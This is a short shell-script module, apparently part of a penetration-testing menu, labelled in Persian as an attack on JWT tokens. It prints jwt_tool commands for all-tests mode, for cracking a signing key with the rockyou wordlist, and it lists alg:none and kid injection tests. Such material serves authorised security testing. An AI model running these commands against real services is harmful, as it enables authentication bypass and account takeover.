DESC="حمله به توکن JWT"
RISK="HIGH"

termux(){ echo "python3 jwt_tool.py <TOKEN> -M at"; }

kali(){
cat <<'EOF'
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool/jwt_tool.py <TOKEN>
# تست‌ها:
#   alg:none
#   کلید ضعیف:
python3 jwt_tool/jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
# kid injection
EOF
}
